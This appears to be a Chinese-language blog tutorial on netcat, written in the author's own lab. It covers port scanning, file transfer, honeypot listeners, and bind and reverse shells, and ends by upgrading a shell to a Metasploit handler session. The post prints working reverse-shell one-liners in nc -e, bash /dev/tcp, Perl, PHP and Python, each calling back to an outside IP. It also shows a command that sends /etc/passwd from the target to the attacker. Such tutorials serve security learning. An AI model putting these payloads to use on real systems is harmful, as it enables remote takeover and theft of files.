    <content type="html"><![CDATA[<p>阿里云ecs:47.106.230.228<br>目标机kali:校园网</p><p>可以输入nc -h查看帮助：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p><h2 id="PortScan-端口扫描"><a href="#PortScan-端口扫描" class="headerlink" title="PortScan(端口扫描)"></a>PortScan(端口扫描)</h2><p>基本tcp扫描：<br><code>nc -vv 47.106.230.228 6666</code><br><code>例：nc -vv 47.106.230.228 6666扫描47.106.230.228 的tcp 6666端口</code></p><p>设置延时，指定端口扫描：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -w secs ip port-port</span><br><span class="line">例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。</span><br></pre></td></tr></table></figure></p><h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><p>客户端(主动)<br><code>nc ip port</code></p><p>服务端(坐等连)<br><code>nc -lvp port</code></p><h2 id="发文件"><a href="#发文件" class="headerlink" title="发文件"></a>发文件</h2><p>主要看<code>&lt;&gt;</code>符号的尖的方向，表示将文件流到其方向</p><p>发送端<br><code>nc -v -w 20 -p 6666  -l &lt; aaa.txt</code></p><p><code>-w 20</code>表示发送前后都等待20秒,根据箭头表示将文件发送到nc中</p><p>接收端<br><code>nc -v -w 2 47.106.230.228  端口 &gt;bbb.txt</code><br>由于我们是接受端，所以时间不用太久,箭头方向表示将nc接收来的文件保存起来</p><p>总的来看就是这样<br><code>aaa.txt --&gt; nc --&gt; bbb.txt</code></p><h4 id="目标机上下载文件"><a href="#目标机上下载文件" class="headerlink" title="目标机上下载文件"></a>目标机上下载文件</h4><p>攻击机<code>nc  -l -p  6666  &gt;  kali.txt</code><br>目标机<code>nc 47.106.230.228 6666  &lt;  /etc/passwd</code><br>这样就将本地kali的文件发给攻击者了</p><h4 id="上传文件至目标机"><a href="#上传文件至目标机" class="headerlink" title="上传文件至目标机"></a>上传文件至目标机</h4><p>攻击机<code>nc  -l -p  6666  &lt; /etc/passwd</code><br>目标机<code>nc 47.106.230.228 6666  &gt;  ecs.txt</code><br>将攻击机中passwd下载至本地ecs.txt,关于<code>&lt;&gt;</code>的用法和上面介绍的一样</p><h4 id="加密传输的数据"><a href="#加密传输的数据" class="headerlink" title="加密传输的数据"></a>加密传输的数据</h4><p>服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt<br>客户端：$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567</p><h4 id="命令记录"><a href="#命令记录" class="headerlink" title="命令记录"></a>命令记录</h4><p><code>nc -vv victim_ip port &lt; path\file.cmd</code></p><h4 id="搭建蜜罐"><a href="#搭建蜜罐" class="headerlink" title="搭建蜜罐"></a>搭建蜜罐</h4><ul><li><code>nc -L -p 80</code> 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</li><li><code>nc -L -p 80 &gt; c:\log.txt</code>作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt<br>*<code>nc -L -p 80 &lt; c:\honeyport.txt</code>作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用</li><li><code>type.exe c:\honeyport | nc -L -p 80</code>作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用</li></ul><p>作为蜜罐使用1：</p><p>命令：<code>nc -L -p  Port</code></p><p>注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止</p><p>作为蜜罐使用2：</p><p>命令：<code>nc -L -p  Port &gt;log.txt</code></p><p>注：使用<code>“-L”</code>参数可以不停的监听某一个端口，知道Ctrl+C为止，同时把结果输出到log.txt文件中，如果把<code>“&gt;”</code>改为<code>“&gt;&gt;”</code>即追加到文件之后。</p><p>这一个命令参数<code>“-L”</code>在Windows中有，现在的Linux中是没有这个选项的，但是自己可以去找找，这里只是想到了之前的这个使用，所以提出来简单介绍一下！</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="正向shell-没有公网ip的主机发起对目标主机的远程连接"><a href="#正向shell-没有公网ip的主机发起对目标主机的远程连接" class="headerlink" title="正向shell(没有公网ip的主机发起对目标主机的远程连接)"></a>正向shell(没有公网ip的主机发起对目标主机的远程连接)</h3><p>公网服务器:47.106.230.228<br>校园网kali</p><p>服务器<br><code>nc -lvp 6666 -t -e /bin/bash</code></p><p>目标主机(可以执行命令)<br><code>nc 47.106.230.228 6666</code></p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p><img src="https://i.loli.net/2018/10/01/5bb1cebd65fee.jpg" alt="Netcat-reverse-shell.jpg"></p><p><code>–e</code>选项发送回一个BashShell的攻击。请注意，我们还可以使用cmd.exe的<code>–e</code>选项的窗口</p><p>netcat监听者<code>nc -lvp 6666</code><br>目标主机<code>nc 47.106.230.228 6666 -e /bin/bash</code><br>对于Windows：<br><code>nc 47.106.230.228 6666 -e cmd.exe</code></p><h4 id="目标主机中没有nc"><a href="#目标主机中没有nc" class="headerlink" title="目标主机中没有nc"></a>目标主机中没有nc</h4><p>上面的情况是目标主机中有nc，如果没有怎么办呢?<br>攻击照常监听<code>nc -lvp 6666</code><br>目标主机<code>bash -i&gt;&amp; /dev/tcp/47.106.230.228/6666 0&gt;&amp;1</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d32d6f137.jpg" alt="Netcat-basics-Reverse-shell-bash-6.jpg"></p><p>注意空格</p><h5 id="使用Perl"><a href="#使用Perl" class="headerlink" title="使用Perl"></a>使用Perl</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="47.106.230.228";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><h5 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a>PHP shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("47.106.230.228",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p><h5 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.106.230.228",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><p><a href="https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/" target="_blank" rel="noopener">流量转发</a></p><h2 id="从nc升级到msf"><a href="#从nc升级到msf" class="headerlink" title="从nc升级到msf"></a>从nc升级到msf</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><p>攻击机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost 47.106.230.228(ecs本机ip)</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure></p><p>目标主机<br><code>nc 47.106.230.228 6666 -e /bin/bash</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d84d6abd4.png" alt=""></p><p>成功获取回话</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料:"></a>资料:</h2><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;阿里云ecs:47.106.230.228&lt;br&gt;目标机kali:校园网&lt;/p&gt;
&lt;p&gt;可以输入nc -h查看帮助：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="netcat" scheme="https://threst.github.io/tags/netcat/"/>
    
  </entry>
  
</feed>
